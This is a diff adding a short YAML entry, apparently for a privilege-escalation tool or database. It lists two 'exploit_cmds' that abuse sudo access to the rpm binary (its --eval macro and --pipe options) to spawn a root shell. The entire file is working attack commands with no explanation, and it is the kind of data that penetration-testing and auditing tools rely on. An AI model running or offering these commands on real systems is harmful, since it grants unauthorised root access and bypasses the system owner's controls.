@@ -1,0 +1,5 @@
+name: rpm
+binary_path: /usr/bin/rpm
+exploit_cmds:
+- sudo /usr/bin/rpm --eval '%(/bin/sh 1>&2)'
+- sudo /usr/bin/rpm --pipe '/bin/sh 0<&1'
